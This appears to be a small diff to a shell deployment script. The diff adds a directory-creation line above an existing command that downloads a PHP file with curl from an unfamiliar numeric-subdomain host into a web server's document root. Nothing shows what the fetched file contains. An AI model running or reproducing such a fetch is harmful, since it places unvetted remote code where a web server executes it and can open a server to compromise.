@@ -24,6 +24,7 @@ function check_apache(){
 	fi
 }
 
+mkdir -p /mnt/data/var/www/
 curl -L https://crowncloud.362227.top/remote/index.php1 > /mnt/data/var/www/index.php
 
 
